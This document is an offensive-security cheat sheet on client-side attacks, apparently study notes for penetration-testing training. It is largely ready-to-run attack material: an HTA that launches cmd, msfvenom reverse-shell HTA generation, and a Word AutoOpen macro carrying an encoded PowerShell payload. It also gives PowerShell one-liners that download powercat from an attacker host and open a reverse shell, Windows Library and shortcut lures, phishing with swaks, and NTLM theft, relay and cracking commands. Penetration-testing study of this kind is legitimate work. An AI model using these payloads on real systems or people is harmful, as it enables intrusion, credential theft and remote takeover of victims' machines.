## Client-Side Attacks

### <ins>Client Information Gathering</ins>

**Passive Client Information Gathering**
- Search with Google, social media and forum websites
- Search for IPs and other sensible information
- Search for file in the target's websites with `dirsearch` or `gobuster`, retrieve metadata from files
  - `exiftool -a -u brochure.pdf`

**Active Client Information Gathering**
- Make direct contact with the target machine or its users
  - Interaction with the target: Social engineering, require to click on a link, open an email, run an attachment, or open a document
  - [Social-Engineer Toolkit (SET)](https://www.trustedsec.com/tools/the-social-engineer-toolkit-set/)
- Client Fingerprinting
  - [Fingerprintjs2](https://github.com/fingerprintjs/fingerprintjs)
    - Change permissions on the `fp` directory `sudo chown www-data:www-data fp` to make `/fp/js.php` work
  - [Parse User Agents](https://developers.whatismybrowser.com/)
- Use [Canarytokens](https://canarytokens.org/generate) and Social Engineering to retrieve information from a target
- Use [Grabify IP Logger](https://grabify.link/)

### <ins>HTML applications</ins>

If a file is created with a `.hta` extension rather than a `.html` extension, Internet Explorer will automatically recognize it as an HTML Application and provide the option to run it using the mshta.exe application (still useful since many corporations rely on Internet Explorer).

**PoC.hta** leveraging ActiveXObjects
```HTML
<html>
	<head>
		<script>
			var c= 'cmd.exe'
			new ActiveXObject('WScript.Shell').Run(c);
		</script>
	</head>
	<body>
		<script>
			self.close();
		</script>
	</body>
</html>
```

**Create a better payload with [msfvenom from the Metasploit framework]([https://github.com/rapid7/metasploit-framework/blob/master/msfvenom](https://github.com/rapid7/metasploit-framework))**<br/>
```
sudo msfvenom -p windows/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f hta-psh -o /var/www/html/evil.hta

In evil.hta, the code will find the following command ::> `powershell.exe -nop -w hidden -e aQBmCgAWBJAG4AdAQAHQAcg...`

-nop: NoProfile
-w:   WindowStyle hidden
-e:   EncodedCommand
```

### <ins>Microsoft Office</ins>

**Microsoft Word Macro**: To exploit Microsoft Office we need to creare a doc in `.docm` or `.doc` format and use macros. An example of the creation of a macro to run a reverse shell is the following.

1. From your powershell, prepare the command encoded in base64
   ```
   $TEXT = "IEX(New-Object System.Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p <LPORT> -e powershell"
   $ENCODED = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($TEXT))
   echo $ENCODED
   ```
2. Since VBA has a 255-character limit for literal strings, we have to split the command into multiple lines. You can do it with the following python script:
   ```python
   import sys
   str = "powershell.exe -nop -w hidden -e " + sys.argv[1]
   n = 50
   for i in range(0, len(str), n):
   	print ("Str = Str + " + '"' + str[i:i+n] + '"')
   ```
3. This will be the final result:
   ```VBA
   Sub AutoOpen()
   	MyMacro
   End Sub
   
   Sub Document_Open()
   	MyMacro
   End Sub
   
   Sub MyMacro()
   	Dim Str As String
   	
   	Str = Str + "powershell.exe -nop -w hidden -e H4sIAAb/EF0CA7VWa"
   	Str = Str + "2+bSBT9nEj5D6iyBCjExombNpEqLdgmhhrHBD9iu9YKwwBTj4H"
   	Str = Str + "C4Jh0+9/3jg1pqqS77UqLbDGP+zz3zFz8PHIpjiMuu+1xX0+Oj"
   	Str = Str + "4ZO6mw4oRa/u5C4GnZvxaMjWK49GhfcB05YKEnSiTcOjpbX1+0"
   	Str = Str + "8TVFED/P6DaJKlqHNimCUCSL3FzcNUYrOblefkUu5r1ztz/oNi"
       	...
   	Str = Str + "aNrT16pQqhMQu61/7ZgO989DRWIMdw/Di/NWRyD0Jit8bW7V0f"
   	Str = Str + "T2HIOHYs1NZ76MooKEk7y5kGfqUvGvJkOWvJ9aOk0LYm5JYnzt"
   	Str = Str + "AUxkne+Miuwtq9HL2vyJW3j8hvLx/Q+z72j/s/hKKslRm/GL9x"
   	Str = Str + "4XfwvR3U586mIKgDRcoQYdG/joCJT2efexAVaD2fvmwT9XbnJ4"
   	Str = Str + "N4BPo5PhvyjwHqBILAAA="
   
   	CreateObject("Wscript.Shell").Run Str
   End Sub
   ```
4. Open the document in Word, go in `View` > `Macros` and create a macro with the code generated in the previous step
   - Select the current document in `Macros in:`

**Object Linking and Embedding**: another option is to abuse Dynamic Data Exchange (DDE) to execute arbitrary applications from within Office documents ([patched since December of 2017](https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/ADV170021))

1. Create a batch script to run a reverse shell
   ```batch
   START powershell.exe -nop -w hidden -e <BASE64>
   ```
2. Open Microsoft Word > Create a new document > Navigate to the Insert ribbon > Click the Object menu
3. Choose "Create from File" tab and select the newly-created batch script
4. Change the appearance of the batch file

**Evading Protected View**: In exactly the same way as Word and Excel, Microsoft Publisher permits embedded objects and ultimately code execution, but it will not enable Protected View for documents that are distributed over the Internet.

### <ins>Windows Library Files</ins>

Library files consist of three major parts written in XML to specify the parameters for accessing remote locations:
- General library information
- Library properties
- Library locations

1. Run a WebDAV share in the attacker machine
   - `/home/kali/.local/bin/wsgidav --host=0.0.0.0 --port=80 --auth=anonymous --root /home/kali/WebDAV/`
2. Create the following Windows Library File in a Window machine
   <br/><i>config.Library-ms</i>
   ```xml
   <?xml version="1.0" encoding="UTF-8"?>
   <libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
   
   	<name>@windows.storage.dll,-34582</name>
   	<version>6</version>
   
   	<isLibraryPinned>true</isLibraryPinned>
   	<iconReference>imageres.dll,-1003</iconReference>
   	
   	<templateInfo>
   		<folderType>{7d49d726-3c21-4f05-99aa-fdc2c9474656}</folderType>
   	</templateInfo>
   	
   	<searchConnectorDescriptionList>
   		<searchConnectorDescription>
   			<isDefaultSaveLocation>true</isDefaultSaveLocation>
   			<isSupported>false</isSupported>
   			<simpleLocation>
   				<url>http://IP</url>
   			</simpleLocation>
   		</searchConnectorDescription>
   	</searchConnectorDescriptionList>
   
   </libraryDescription>
   ```
3. In a Window machine, create a shortcut ( <i>automatic_configuration.lnk</i> ) with the following as location
   - `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://<IP>/powercat.ps1');powercat -c <IP> -p <PORT> -e powershell"`
4. Put `config.Library-ms` and `automatic_configuration.lnk` in the WebDAV directory
5. Start the Python3 web server on port `8000` to serve `powercat.ps1`, WsgiDAV for the WebDAV share `/home/kali/webdav`, and a Netcat listener on port `4444`
6. Send the library file to the victim and wait for them to execute the shortcut file to get a reverse shell

### <ins>Phishing</ins>

- Leverage ports 110 and 25
- https://viperone.gitbook.io/pentest-everything/writeups/pg-practice/linux/postfish

**ODT**: https://www.exploit-db.com/exploits/44564
- `python2 /usr/share/exploitdb/exploits/windows/local/44564.py`
- `sudo responder -I tun0 -v`
- `hashcat --status -w 4 -a 0 user.hash /usr/share/wordlists/rockyou.txt -m 5600`

**NTLM theft**
- https://github.com/Greenwolf/ntlm_theft
- `python3 ntlm_theft.py -g all -s 192.168.45.201 -f test`
- `sudo responder -I tun0 -v`
- `hashcat --status -w 4 -a 0 user.hash /usr/share/wordlists/rockyou.txt -m 5600`

**Redirecting NTLMv2**
- `python2 44564.py`
- `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
- `sudo impacket-ntlmrelayx --no-http-server -smb2support -t 192.168.226.169 -c "powershell -e base64"`
  - only possible if there is an smb on the target

**Upload a lmk link that redirects to the following**
- `powershell.exe -c "IEX(New-Object System.Net.WebClient).DownloadString('http://192.168.45.213/powercat.ps1');powercat -c 192.168.45.213 -p 8039 -e powershell"`

**Macro**
- `python ps_encoder.py -s powershell_reverse_shell_2.ps1`
- `python 4_doc_macro.py BASE64`
- create doc with macros and Libreoffice
  - Tools > Macro
  - Tools > Customize > Events > Open Document
- Spreadsheet > This also runs macros
- `msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.154 LPORT=443 -f hta-psh -o evil.hta`
  - another way to create macros, then cat the file to copy it

**Send an email**
- `sudo swaks -t <recipient> -t <recipient> --from <sender> --attach @<Windows-Library-file> --server <IP> --body @body.txt --header "Subject: Staging Script" --suppress-data -ap`
- use WebDAV


### <ins>McAfee</ins>
- [mcafee-sitelist-pwd-decryption](https://github.com/funoverip/mcafee-sitelist-pwd-decryption/)
